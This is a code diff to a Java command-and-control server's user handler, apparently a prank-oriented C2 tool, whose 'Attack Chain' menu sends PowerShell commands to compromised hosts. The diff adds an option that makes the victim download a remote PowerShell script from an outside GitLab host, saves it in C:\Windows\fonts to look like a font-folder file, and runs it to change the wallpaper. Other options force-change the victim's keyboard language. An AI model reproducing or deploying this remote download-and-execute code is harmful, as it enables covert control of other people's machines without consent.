@@ -544,7 +544,7 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("2. Change Keyboard Language [EASY]");
                 System.out.println("3. Change Keybaord Layout [HARD]");
                 System.out.println("4. Change Keybaord Layout to English");
-                System.out.println("5. Send Message Box");
+                System.out.println("5. Change Wallpaper");
                 System.out.println("6. Back");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
@@ -573,7 +573,7 @@ public class C2ServerUserHandler implements Runnable{
                 String windowsCommands = "";
                 String linuxCommands = "";
 
-                // Attach Chain implementations
+                // Attack Chain implementations
                 if(userAttackChainChoice.equals("1")){
                     // TODO: Figure out how to launch the goose.
                 } else if (userAttackChainChoice.equals("2")){
@@ -582,10 +582,10 @@ public class C2ServerUserHandler implements Runnable{
                     // Windows
                     windowsCommands = "";
                     windowsCommands += "Set-WinUserLanguageList fr-FR -force;";
-                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
+                    //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    //windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                     windowsCommands += "Start-Sleep -Seconds 60;";
-                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    //windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     windowsCommands += "Set-WinUserLanguageList en-US -force";
 
                     // Linux
@@ -609,11 +609,11 @@ public class C2ServerUserHandler implements Runnable{
                     languages.put("Italian","it-IT");
                     for(String language : languages.keySet()){
                         windowsCommands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
-                        windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                        windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
+                        //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                        //windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
                         windowsCommands += "Start-Sleep -Seconds 30;";
                     }
-                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    //windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     windowsCommands += "Set-WinUserLanguageList en-US -force;";
 
                     // Linux
@@ -638,8 +638,8 @@ public class C2ServerUserHandler implements Runnable{
                     // Windows
                     windowsCommands = "";
                     windowsCommands += "Set-WinUserLanguageList en-US -force;";
-                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that heres english')";
+                    //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    //windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that heres english')";
 
                     // Linux
                     linuxCommands = "";
@@ -648,18 +648,16 @@ public class C2ServerUserHandler implements Runnable{
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("5")){
                     // Send a message box
-                    System.out.println("Enter A Message to Display: ");
+                    System.out.println("Enter URL of Photo: ");
                     System.out.print(" >> ");
-                    String message = userInputScanner.nextLine();
+                    String photoURL = userInputScanner.nextLine();
                     
                     // Windows
                     windowsCommands = "";
-                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    windowsCommands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
+                    windowsCommands += "wget -o C:\\Windows\\fonts\\wallpaper.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsAttackChainScripts/changeWallpaper.ps1?ref_type=heads";
+                    windowsCommands += "& 'C:\\Windows\\fonts\\wallpaper.ps1 -wallpaperURL " + photoURL;
 
-                    // Linux
-                    linuxCommands = "";
-                    linuxCommands += "notify-send " + message;
+
                 }else if (userAttackChainChoice.equals("6")){
                     currentUserPath = "";
                 } else {
